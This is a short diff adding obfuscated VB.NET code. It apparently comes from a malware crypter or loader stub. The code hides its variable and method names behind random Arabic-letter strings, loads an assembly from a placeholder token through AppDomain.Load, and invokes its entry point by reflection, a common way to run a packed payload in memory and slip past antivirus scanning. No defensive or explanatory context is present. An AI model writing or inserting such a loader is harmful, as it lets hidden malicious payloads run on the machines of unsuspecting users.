@@ -1,0 +1,3 @@
+﻿ Dim ثصعقغعهثصقتياسبتانلسيباتل As System.Object = System.AppDomain.CurrentDomain
+        Dim يساتبءؤىلالاىراتلثعغثصفق As Reflection.Assembly = ثصعقغعهثصقتياسبتانلسيباتل.Load(".:R4Jaw:.")
+        يساتبءؤىلالاىراتلثعغثصفق.EntryPoint.Invoke("ثقثصعهقهعصثغقهعيسابلاتلرلاؤىؤءراتيسبتالثصسغعصثق", Nothing)
